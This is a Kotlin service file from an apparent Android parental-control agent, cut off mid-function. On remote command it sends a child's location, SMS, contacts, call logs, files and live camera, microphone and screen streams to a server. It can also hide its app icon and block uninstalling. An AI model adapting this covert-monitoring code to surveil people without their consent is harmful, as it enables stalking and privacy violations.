package com.parentalcontrol.kidsagent.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.parentalcontrol.kidsagent.KidsAgentApp
import com.parentalcontrol.kidsagent.R
import com.parentalcontrol.kidsagent.data.helper.DeviceDataHelper
import com.parentalcontrol.kidsagent.data.model.*
import com.parentalcontrol.kidsagent.data.network.AgentWebSocketClient
import com.parentalcontrol.kidsagent.location.LocationTracker
import com.parentalcontrol.kidsagent.ui.MainActivity
import com.parentalcontrol.kidsagent.ui.OverlayLockActivity
import com.parentalcontrol.kidsagent.usage.UsageTracker
import com.parentalcontrol.kidsagent.webrtc.WebRTCStreamManager
import java.util.Calendar
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import com.parentalcontrol.kidsagent.data.db.AppDatabase
import com.parentalcontrol.kidsagent.data.db.OfflineCallLogEntity
import com.parentalcontrol.kidsagent.data.db.OfflineRiskAlertEntity
import com.parentalcontrol.kidsagent.sync.OfflineSyncWorker

class ForegroundSyncService : Service() {

    companion object {
        private const val TAG = "ForegroundSyncService"
        private const val NOTIFICATION_ID = 1001
        var isServiceRunning = false
            private set

        var instance: ForegroundSyncService? = null
            private set

        val blockedPackages = mutableSetOf<String>()

        @Volatile
        var isMonitoringPaused: Boolean = false

        fun loadMonitoringState(context: Context) {
            try {
                val prefs = context.getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                isMonitoringPaused = prefs.getBoolean("is_monitoring_paused", false)
                AgentAccessibilityService.isMonitoringPaused = isMonitoringPaused
                Log.i("ForegroundSyncService", "Loaded isMonitoringPaused: $isMonitoringPaused")
            } catch (e: Exception) {
                Log.e("ForegroundSyncService", "Error loading monitoring state: ${e.message}")
            }
        }

        fun saveMonitoringState(context: Context, paused: Boolean) {
            try {
                isMonitoringPaused = paused
                AgentAccessibilityService.isMonitoringPaused = paused
                val prefs = context.getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("is_monitoring_paused", paused).apply()
                Log.i("ForegroundSyncService", "Saved isMonitoringPaused: $isMonitoringPaused")
            } catch (e: Exception) {
                Log.e("ForegroundSyncService", "Error saving monitoring state: ${e.message}")
            }
        }

        fun loadBlockedPackages(context: Context) {
            try {
                val prefs = context.getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                val set = prefs.getStringSet("blocked_packages", emptySet()) ?: emptySet()
                synchronized(blockedPackages) {
                    blockedPackages.clear()
                    blockedPackages.addAll(set)
                }
                Log.i("ForegroundSyncService", "Loaded ${blockedPackages.size} blocked packages: $blockedPackages")
            } catch (e: Exception) {
                Log.e("ForegroundSyncService", "Error loading blocked packages: ${e.message}")
            }
        }

        fun saveBlockedPackages(context: Context) {
            try {
                val prefs = context.getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                synchronized(blockedPackages) {
                    prefs.edit().putStringSet("blocked_packages", HashSet(blockedPackages)).apply()
                }
                Log.i("ForegroundSyncService", "Saved ${blockedPackages.size} blocked packages to prefs")
            } catch (e: Exception) {
                Log.e("ForegroundSyncService", "Error saving blocked packages: ${e.message}")
            }
        }

        @Volatile
        var isWebFilterEnabled: Boolean = true
        val activeBlockedKeywords = mutableSetOf<String>()
        val activeBlockedDomains = mutableSetOf<String>()

        fun loadWebFilterRules(context: Context) {
            try {
                val prefs = context.getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                isWebFilterEnabled = prefs.getBoolean("is_web_filter_enabled", true)
                val kwSet = prefs.getStringSet("web_filter_keywords", emptySet()) ?: emptySet()
                val domSet = prefs.getStringSet("web_filter_domains", emptySet()) ?: emptySet()
                synchronized(activeBlockedKeywords) {
                    activeBlockedKeywords.clear()
                    activeBlockedKeywords.addAll(kwSet)
                }
                synchronized(activeBlockedDomains) {
                    activeBlockedDomains.clear()
                    activeBlockedDomains.addAll(domSet)
                }
                Log.i("ForegroundSyncService", "Loaded web filter: enabled=$isWebFilterEnabled, keywords=${activeBlockedKeywords.size}, domains=${activeBlockedDomains.size}")
            } catch (e: Exception) {
                Log.e("ForegroundSyncService", "Error loading web filter rules: ${e.message}")
            }
        }

        fun saveWebFilterRules(context: Context, enabled: Boolean, keywords: Collection<String>?, domains: Collection<String>?) {
            try {
                isWebFilterEnabled = enabled
                val prefs = context.getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                val editor = prefs.edit().putBoolean("is_web_filter_enabled", enabled)
                if (keywords != null) {
                    synchronized(activeBlockedKeywords) {
                        activeBlockedKeywords.clear()
                        activeBlockedKeywords.addAll(keywords)
                    }
                    editor.putStringSet("web_filter_keywords", HashSet(activeBlockedKeywords))
                }
                if (domains != null) {
                    synchronized(activeBlockedDomains) {
                        activeBlockedDomains.clear()
                        activeBlockedDomains.addAll(domains)
                    }
                    editor.putStringSet("web_filter_domains", HashSet(activeBlockedDomains))
                }
                editor.apply()
                Log.i("ForegroundSyncService", "Saved web filter: enabled=$enabled, keywords=${activeBlockedKeywords.size}, domains=${activeBlockedDomains.size}")
            } catch (e: Exception) {
                Log.e("ForegroundSyncService", "Error saving web filter rules: ${e.message}")
            }
        }

        fun start(context: Context) {
            val intent = Intent(context, ForegroundSyncService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun onScreenCapturePermissionGranted(intent: Intent) {
            instance?.webRTCManager?.startScreenCaptureWithIntent(intent)
        }

        fun onScreenCapturePermissionDenied() {
            val errPayload = mapOf("error" to "تم رفض إذن التقاط الشاشة على هاتف الطفل", "type" to "PERMISSION_DENIED")
            instance?.wsClient?.sendMessage("STREAM_ERROR", errPayload)
        }

        fun reportTamperAlert(context: Context, snippet: String, category: String = "TAMPER_ATTEMPT") {
            val s = instance
            if (s != null) {
                s.sendTamperAlert(snippet, category)
            } else {
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val db = AppDatabase.getInstance(context)
                        val alert = RiskAlertPayload(
                            category = category,
                            severity = "HIGH",
                            snippet = snippet,
                            source = "Anti-Uninstall Protection",
                            timestamp = System.currentTimeMillis()
                        )
                        db.riskAlertDao().insertRiskAlert(OfflineRiskAlertEntity.fromPayload(alert, false))
                        OfflineSyncWorker.enqueue(context)
                    } catch (e: Exception) {
                        Log.e("ForegroundSyncService", "Error saving tamper alert fallback: ${e.message}")
                    }
                }
            }
        }
    }

    fun ensureMediaProjectionForegroundType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                val notification = buildForegroundNotification()
                var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
                startForeground(NOTIFICATION_ID, notification, serviceType)
                Log.i(TAG, "Promoted ForegroundService to MEDIA_PROJECTION type")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to promote foreground service to media projection: ${e.message}")
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val httpClient = OkHttpClient()
    private var wsClient: AgentWebSocketClient? = null
    private var locationTracker: LocationTracker? = null
    private var usageTracker: UsageTracker? = null
    private var webRTCManager: WebRTCStreamManager? = null
    private var alarmPlayer: MediaPlayer? = null
    private val gson = Gson()
    private lateinit var deviceDataHelper: DeviceDataHelper
    private var lastLowBatteryAlertTime = 0L
    private var screenTimeRule: ScreenTimeRulePayload? = null

    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private lateinit var appDb: AppDatabase
    private var simWatcher: SimAndAirplaneWatcher? = null


    override fun onCreate() {
        super.onCreate()
        instance = this
        isServiceRunning = true
        Log.d(TAG, "ForegroundSyncService onCreate")

        val notification = buildForegroundNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
            startForeground(NOTIFICATION_ID, notification, serviceType)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        ensureMediaProjectionForegroundType()

        appDb = AppDatabase.getInstance(this)
        usageTracker = UsageTracker(this)
        deviceDataHelper = DeviceDataHelper(this)
        loadPersistedScreenTimeRule()
        loadBlockedPackages(this)
        loadMonitoringState(this)
        loadWebFilterRules(this)
        val safetyPrefs = getSharedPreferences("kids_agent_safety", Context.MODE_PRIVATE)
        val savedSafe = safetyPrefs.getStringSet("safe_risk_patterns", emptySet()) ?: emptySet()
        com.parentalcontrol.kidsagent.safety.RiskDetector.setSafePatterns(savedSafe)
        Log.i(TAG, "Loaded ${savedSafe.size} persisted safe patterns into RiskDetector")
        syncBlockedPackagesFromServer()
        initWebSocket()
        initLocation()
        initWebRTC()
        registerNetworkCallback()

        // 1. Enterprise Anti-Tamper & Device Owner
        DeviceOwnerManager.applyEnterpriseRestrictions(this)

        // 2. SIM Card and Airplane Mode Watcher
        simWatcher = SimAndAirplaneWatcher(this)
        simWatcher?.startWatching()

        OfflineSyncWorker.schedulePeriodic(this)
        OfflineSyncWorker.enqueue(this) // Flush any existing offline records
        schedulePeriodicUsageSync()
        schedulePeriodicContentSync()
        scheduleScreenTimeAndBedtimeMonitor()
    }

    fun sendWsMessage(type: String, payload: Any): Boolean {
        return wsClient?.sendMessage(type, payload) ?: false
    }

    fun sendNotificationForward(payload: NotificationPayload): Boolean {
        return wsClient?.sendMessage("NOTIFICATION_FORWARD", payload) ?: false
    }

    fun sendRiskAlert(alert: RiskAlertPayload): Boolean {
        return wsClient?.sendMessage("RISK_ALERT", alert) ?: false
    }

    fun sendTamperAlert(snippet: String, category: String = "TAMPER_ATTEMPT") {
        scope.launch(Dispatchers.IO) {
            try {
                val alert = RiskAlertPayload(
                    category = category,
                    severity = "HIGH",
                    snippet = snippet,
                    source = "Anti-Uninstall Protection",
                    timestamp = System.currentTimeMillis()
                )
                val sentRisk = wsClient?.sendMessage("RISK_ALERT", alert) ?: false
                val sentTamper = wsClient?.sendMessage("TAMPER_ALERT", alert) ?: false
                val alertEntity = OfflineRiskAlertEntity.fromPayload(alert, isSynced = sentRisk || sentTamper)
                appDb.riskAlertDao().insertRiskAlert(alertEntity)
                if (!sentRisk && !sentTamper) {
                    OfflineSyncWorker.enqueue(this@ForegroundSyncService)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send tamper alert: ${e.message}")
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildForegroundNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, KidsAgentApp.CHANNEL_ID)
            .setContentTitle(getString(R.string.service_running_title))
            .setContentText(getString(R.string.service_running_desc))
            .setSmallIcon(android.R.drawable.ic_secure)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    private fun initWebSocket() {
        wsClient = AgentWebSocketClient(this) { msg ->
            handleIncomingMessage(msg)
        }
        wsClient?.connect()
    }

    private fun initLocation() {
        locationTracker = LocationTracker(this) { loc ->
            val sent = wsClient?.sendMessage("LOCATION_UPDATE", loc) ?: false

            // Immediate REST fallback to ensure PostgreSQL saves location
            scope.launch(Dispatchers.IO) {
                try {
                    val app = KidsAgentApp.instance
                    val deviceId = app.prefs.getString(KidsAgentApp.KEY_DEVICE_ID, null)
                    val serverUrl = app.prefs.getString(KidsAgentApp.KEY_SERVER_URL, null)
                    if (deviceId != null && serverUrl != null) {
                        val body = gson.toJson(loc).toRequestBody("application/json".toMediaType())
                        val req = Request.Builder()
                            .url("$serverUrl/api/v1/devices/$deviceId/location")
                            .post(body)
                            .build()
                        val res = httpClient.newCall(req).execute()
                        res.close()
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Location REST fallback failed (offline): ${e.message}")
                    if (!sent) {
                        OfflineSyncWorker.enqueue(this@ForegroundSyncService)
                    }
                }
            }
        }
        locationTracker?.startTracking()
    }


    private fun initWebRTC() {
        webRTCManager = WebRTCStreamManager(this) { signalingType, payload ->
            wsClient?.sendMessage(signalingType, payload)
        }
    }

    private fun handleIncomingMessage(msg: WSMessage) {
        Log.d(TAG, "Received message type: ${msg.type}")

        when (msg.type) {
            "COMMAND_REQUEST" -> {
                if (msg.payload != null) {
                    val cmd = gson.fromJson(msg.payload, CommandRequest::class.java)
                    executeCommand(cmd)
                }
            }
            "SCREEN_TIME_RULE_SYNC" -> {
                if (msg.payload != null) {
                    val rule = gson.fromJson(msg.payload, ScreenTimeRulePayload::class.java)
                    saveScreenTimeRule(rule)
                }
            }
            "RTC_OFFER" -> {
                if (msg.payload != null) {
                    webRTCManager?.handleRemoteOffer(msg.payload)
                }
            }
            "RTC_ICE_CANDIDATE" -> {
                if (msg.payload != null) {
                    webRTCManager?.handleRemoteCandidate(msg.payload)
                }
            }
            "STREAM_STOP" -> {
                webRTCManager?.stopStreaming()
            }
            "CAMERA_SWITCH", "SWITCH_CAMERA" -> {
                webRTCManager?.switchCamera { isFront, err ->
                    val payload = mapOf(
                        "success" to (err == null),
                        "is_front" to isFront,
                        "error" to err
                    )
                    wsClient?.sendMessage("CAMERA_SWITCH_RESULT", payload)
                }
            }
            "TAKE_SCREENSHOT" -> {
                takeScreenshotAndSend()
            }
            "GET_DEVICE_OWNER_STATUS" -> {
                val status = DeviceOwnerManager.getStatusMap(this)
                wsClient?.sendMessage("DEVICE_OWNER_STATUS", status)
            }
            "BLOCKED_APPS_SYNC" -> {
                if (msg.payload != null) {
                    try {
                        val pkgs = gson.fromJson(msg.payload, Array<String>::class.java)
                        synchronized(blockedPackages) {
                            blockedPackages.clear()
                            blockedPackages.addAll(pkgs)
                        }
                        saveBlockedPackages(this)
                        Log.i(TAG, "Synced ${blockedPackages.size} blocked packages via WebSocket: $blockedPackages")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing BLOCKED_APPS_SYNC: ${e.message}")
                    }
                }
            }
            "WEB_FILTER_SYNC" -> {
                if (msg.payload != null) {
                    try {
                        val payloadStr = msg.payload.toString()
                        val json = org.json.JSONObject(payloadStr)
                        val enabled = json.optBoolean("is_web_filter_enabled", true)
                        val kwArray = json.optJSONArray("keywords")
                        val domArray = json.optJSONArray("domains")
                        val kws = mutableListOf<String>()
                        if (kwArray != null) {
                            for (i in 0 until kwArray.length()) {
                                kws.add(kwArray.getString(i))
                            }
                        }
                        val doms = mutableListOf<String>()
                        if (domArray != null) {
                            for (i in 0 until domArray.length()) {
                                doms.add(domArray.getString(i))
                            }
                        }
                        saveWebFilterRules(this, enabled, kws, doms)
                        Log.i(TAG, "Synced web filter via WebSocket: enabled=$enabled, keywords=${kws.size}, domains=${doms.size}")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing WEB_FILTER_SYNC: ${e.message}")
                    }
                }
            }
            "SAFE_RISK_PATTERNS_SYNC" -> {
                if (msg.payload != null) {
                    try {
                        val payloadStr = msg.payload.toString()
                        val json = org.json.JSONObject(payloadStr)
                        val pArray = json.optJSONArray("patterns")
                        val patterns = mutableListOf<String>()
                        if (pArray != null) {
                            for (i in 0 until pArray.length()) {
                                patterns.add(pArray.getString(i))
                            }
                        }
                        com.parentalcontrol.kidsagent.safety.RiskDetector.setSafePatterns(patterns)
                        val safetyPrefs = getSharedPreferences("kids_agent_safety", Context.MODE_PRIVATE)
                        safetyPrefs.edit().putStringSet("safe_risk_patterns", HashSet(patterns)).apply()
                        Log.i(TAG, "Synced ${patterns.size} safe risk patterns via WebSocket: $patterns")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing SAFE_RISK_PATTERNS_SYNC: ${e.message}")
                    }
                }
            }
            "FETCH_CALLS" -> {
                syncCallLogs()
            }
            "FETCH_FILE_DATA" -> {
                if (msg.payload != null) {
                    try {
                        val req = gson.fromJson(msg.payload, FetchFileDataPayload::class.java)
                        scope.launch(Dispatchers.IO) {
                            val base64 = deviceDataHelper.getFileBase64(req.filePath)
                            val res = FileDataResultPayload(
                                filePath = req.filePath,
                                fileBase64 = base64,
                                error = if (base64 == null) "تعذر قراءة أو ترميز الملف" else null
                            )
                            wsClient?.sendMessage("FILE_DATA_RESULT", res)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error handling FETCH_FILE_DATA: ${e.message}")
                    }
                }
            }
            "PAUSE_MONITORING" -> {
                saveMonitoringState(this, true)
                Log.i(TAG, "PAUSE_MONITORING applied via WS")
            }
            "RESUME_MONITORING" -> {
                saveMonitoringState(this, false)
                syncBlockedPackagesFromServer()
                Log.i(TAG, "RESUME_MONITORING applied via WS")
            }
        }
    }

    private fun executeCommand(cmd: CommandRequest) {
        var success = true
        var errorMsg: String? = null

        try {
            when (cmd.action) {
                "LOCK_DEVICE" -> {
                    lockDeviceScreen("تم قفل الجهاز يدوياً بواسطة الوالدين\n(Locked Manually by Parents)")
                }
                "UNLOCK_DEVICE" -> {
                    unlockDeviceScreen()
                }
                "PLAY_ALARM" -> {
                    playAlarmSound()
                }
                "STOP_ALARM" -> {
                    stopAlarmSound()
                }
                "BLOCK_APP" -> {
                    val pkg = cmd.params?.get("package_name") as? String
                    if (!pkg.isNullOrEmpty()) {
                        synchronized(blockedPackages) {
                            blockedPackages.add(pkg)
                        }
                        saveBlockedPackages(this)
                        Log.w(TAG, "App successfully blocked: $pkg (Total blocked: ${blockedPackages.size})")
                    }
                }
                "UNBLOCK_APP" -> {
                    val pkg = cmd.params?.get("package_name") as? String
                    if (!pkg.isNullOrEmpty()) {
                        synchronized(blockedPackages) {
                            blockedPackages.remove(pkg)
                        }
                        saveBlockedPackages(this)
                        Log.w(TAG, "App successfully unblocked: $pkg (Total blocked: ${blockedPackages.size})")
                    }
                }
                "FETCH_CONTACTS" -> {
                    scope.launch(Dispatchers.IO) {
                        val contacts = deviceDataHelper.getContacts()
                        wsClient?.sendMessage("CONTACTS_SYNC", contacts)
                    }
                }
                "FETCH_SMS" -> {
                    scope.launch(Dispatchers.IO) {
                        val smsList = deviceDataHelper.getSmsMessages(50)
                        val encryptedList = smsList.map {
                            it.copy(body = com.parentalcontrol.kidsagent.security.CryptoHelper.encrypt(it.body))
                        }
                        wsClient?.sendMessage("SMS_SYNC", encryptedList)
                    }
                }
                "FETCH_FILES" -> {
                    scope.launch(Dispatchers.IO) {
                        val files = deviceDataHelper.getRecentFiles(30)
                        wsClient?.sendMessage("FILES_SYNC", files)
                    }
                }
                "SWITCH_CAMERA", "CAMERA_SWITCH" -> {
                    webRTCManager?.switchCamera { isFront, err ->
                        val payload = mapOf(
                            "success" to (err == null),
                            "is_front" to isFront,
                            "error" to err
                        )
                        wsClient?.sendMessage("CAMERA_SWITCH_RESULT", payload)
                    }
                }
                "FETCH_CALLS" -> {
                    syncCallLogs()
                }
                "TAKE_SCREENSHOT" -> {
                    takeScreenshotAndSend()
                }
                "FETCH_FILE_DATA" -> {
                    val filePath = cmd.params?.get("file_path") as? String
                    if (!filePath.isNullOrEmpty()) {
                        scope.launch(Dispatchers.IO) {
                            val base64 = deviceDataHelper.getFileBase64(filePath)
                            val res = FileDataResultPayload(
                                filePath = filePath,
                                fileBase64 = base64,
                                error = if (base64 == null) "تعذر قراءة أو ترميز الملف" else null
                            )
                            wsClient?.sendMessage("FILE_DATA_RESULT", res)
                        }
                    }
                }
                "HIDE_APP_ICON" -> {
                    val p = packageManager
                    val component = ComponentName(this, MainActivity::class.java)
                    p.setComponentEnabledSetting(
                        component,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    val prefs = getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("is_stealth_mode", true).apply()
                    Log.i(TAG, "Stealth mode activated: App icon hidden")
                }
                "SHOW_APP_ICON" -> {
                    val p = packageManager
                    val component = ComponentName(this, MainActivity::class.java)
                    p.setComponentEnabledSetting(
                        component,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    val prefs = getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("is_stealth_mode", false).apply()
                    Log.i(TAG, "Stealth mode deactivated: App icon restored")
                }
                "SET_ANTI_UNINSTALL" -> {
                    val enabled = when (val v = cmd.params?.get("enabled")) {
                        is Boolean -> v
                        is String -> v.toBoolean()
                        is Number -> v.toInt() != 0
                        else -> true
                    }
                    AgentAccessibilityService.isAntiUninstallEnabled = enabled
                    val prefs = getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("anti_uninstall", enabled).apply()
                    Log.i(TAG, "Anti-uninstall protection set to $enabled")
                }
                "SET_BLOCK_SETTINGS" -> {
                    val enabled = when (val v = cmd.params?.get("enabled")) {
                        is Boolean -> v
                        is String -> v.toBoolean()
                        is Number -> v.toInt() != 0
                        else -> false
                    }
                    AgentAccessibilityService.isBlockSettingsEnabled = enabled
                    val prefs = getSharedPreferences("security_prefs", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("block_settings", enabled).apply()
                    Log.i(TAG, "Block Settings set to $enabled")
                }
                "PAUSE_MONITORING" -> {
                    saveMonitoringState(this, true)
                    Log.i(TAG, "PAUSE_MONITORING command executed")
                }
                "RESUME_MONITORING" -> {
                    saveMonitoringState(this, false)
                    syncBlockedPackagesFromServer()
                    Log.i(TAG, "RESUME_MONITORING command executed")
                }
                else -> {
                    success = false
                    errorMsg = "Unknown command action: ${cmd.action}"
                }
            }
        } catch (e: Exception) {
            success = false
            errorMsg = e.message
        }

        // Send ACK back
        val ack = CommandAck(
            commandId = cmd.commandId,
            success = success,
            error = errorMsg
        )
        wsClient?.sendMessage("COMMAND_ACK", ack)
    }

    private fun lockDeviceScreen(reason: String = "تم قفل الهاتف بواسطة منظومة سَنَد") {
        // 1. DevicePolicyManager hardware lock
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
        val adminComponent = ComponentName(this, AgentDeviceAdminReceiver::class.java)
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.lockNow()
        }

        // 2. Launch full screen persistent lock overlay
        val lockIntent = Intent(this, OverlayLockActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            putExtra("EXTRA_REASON", reason)
        }
        startActivity(lockIntent)
    }

    private fun unlockDeviceScreen() {
        sendBroadcast(Intent("ACTION_DISMISS_PARENTAL_LOCK"))
    }

    private var alarmTimeoutJob: Job? = null

    private fun playAlarmSound() {
        stopAlarmSound()
        try {
            Log.w(TAG, "Playing alarm siren on device...")
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.setStreamVolume(
                AudioManager.STREAM_ALARM,
                audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM),
                0
            )

            val alertUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)

            alarmPlayer = MediaPlayer().apply {
                setDataSource(this@ForegroundSyncService, alertUri)
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                isLooping = true
                prepare()
                start()
            }

            // Auto-stop after 45 seconds so it does not ring indefinitely
            alarmTimeoutJob?.cancel()
            alarmTimeoutJob = scope.launch {
                delay(45_000L)
                Log.w(TAG, "Alarm siren auto-stopped after 45 seconds timeout.")
                stopAlarmSound()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to play siren: ${e.message}")
        }
    }

    private fun stopAlarmSound() {
        try {
            alarmTimeoutJob?.cancel()
            alarmTimeoutJob = null
            alarmPlayer?.let { player ->
                if (player.isPlaying) {
                    player.stop()
                }
                player.release()
            }
            alarmPlayer = null
            Log.w(TAG, "Alarm siren stopped and player released.")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping alarm: ${e.message}")
        }
    }

    private fun schedulePeriodicUsageSync() {
        scope.launch {
            // Immediate sync on service start
            syncAppsAndUsage()
            while (isActive) {
                delay(15 * 60 * 1000L) // Every 15 minutes
                syncAppsAndUsage()
            }
        }
    }

    private fun syncAppsAndUsage() {
        scope.launch(Dispatchers.IO) {
            try {
                val apps = usageTracker?.getInstalledApps() ?: emptyList()
                val usage = usageTracker?.getTodayUsageStats() ?: emptyList()

                Log.d(TAG, "Syncing ${apps.size} installed apps and ${usage.size} usage stats")

                if (apps.isNotEmpty()) {
                    wsClient?.sendMessage("APPS_INVENTORY_SYNC", apps)

                    // Also sync via REST API fallback for instant DB persistence
                    val app = KidsAgentApp.instance
                    val deviceId = app.prefs.getString(KidsAgentApp.KEY_DEVICE_ID, null)
                    val serverUrl = app.prefs.getString(KidsAgentApp.KEY_SERVER_URL, null)
                    if (deviceId != null && serverUrl != null) {
                        val payload = mapOf("apps" to apps)
                        val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
                        val req = Request.Builder()
                            .url("$serverUrl/api/v1/devices/$deviceId/apps/sync")
                            .post(body)
                            .build()
                        try {
                            httpClient.newCall(req).execute().close()
                            Log.d(TAG, "REST apps sync successful: ${apps.size} apps")
                        } catch (e: Exception) {
                            Log.w(TAG, "REST apps sync failed: ${e.message}")
                        }
                    }
                }

                if (usage.isNotEmpty()) {
                    wsClient?.sendMessage("APP_USAGE_SYNC", usage)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error syncing usage: ${e.message}")
            }
        }
    }

    private fun schedulePeriodicContentSync() {
        scope.launch(Dispatchers.IO) {
            delay(5000L) // Wait for WS connection
            try {
                val contacts = deviceDataHelper.getContacts()
                if (contacts.isNotEmpty()) {
                    wsClient?.sendMessage("CONTACTS_SYNC", contacts)
                    Log.d(TAG, "Synced ${contacts.size} contacts to parents")
                }

                val smsList = deviceDataHelper.getSmsMessages(50)
                if (smsList.isNotEmpty()) {
                    val encryptedList = smsList.map {
                        it.copy(body = com.parentalcontrol.kidsagent.security.CryptoHelper.encrypt(it.body))
                    }
                    wsClient?.sendMessage("SMS_SYNC", encryptedList)
                    Log.d(TAG, "Synced ${smsList.size} E2EE encrypted SMS to parents")

                    // AI Content Risk Scan on SMS
                    for (sms in smsList.take(20)) {
                        val alert = com.parentalcontrol.kidsagent.safety.RiskDetector.scan(sms.body, "SMS: ${sms.sender}")
                        if (alert != null) {
                            val sent = wsClient?.sendMessage("RISK_ALERT", alert) ?: false
                            Log.w(TAG, "AI Risk detected in SMS: ${alert.category} / ${alert.severity}")
                            val alertEntity = OfflineRiskAlertEntity.fromPayload(alert, isSynced = sent)
                            appDb.riskAlertDao().insertRiskAlert(alertEntity)
                            if (!sent) {
                                OfflineSyncWorker.enqueue(this@ForegroundSyncService)
                            }
                        }
                    }
                }

                val files = deviceDataHelper.getRecentFiles(30)
                if (files.isNotEmpty()) {
                    wsClient?.sendMessage("FILES_SYNC", files)
                    Log.d(TAG, "Synced ${files.size} files to parents")
                }

                syncCallLogs()
            } catch (e: Exception) {
                Log.e(TAG, "Content sync error: ${e.message}")
            }
        }
    }

    private fun syncCallLogs() {
        scope.launch(Dispatchers.IO) {
            try {
                val calls = deviceDataHelper.getCallLogs(50)
                if (calls.isNotEmpty()) {
                    val callEntities = calls.map { OfflineCallLogEntity.fromPayload(it, isSynced = false) }
                    appDb.callLogDao().insertCallLogs(callEntities)

                    val sent = wsClient?.sendMessage("CALLS_SYNC", calls) ?: false
                    if (sent) {
                        appDb.callLogDao().markCallLogsSynced(callEntities.map { it.id })
                        Log.d(TAG, "Synced ${calls.size} call logs to parents via WS")
                    } else {
                        Log.w(TAG, "WS disconnected while syncing calls; enqueuing OfflineSyncWorker")
                        OfflineSyncWorker.enqueue(this@ForegroundSyncService)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error syncing call logs: ${e.message}")
            }
        }
    }


    private fun takeScreenshotAndSend() {
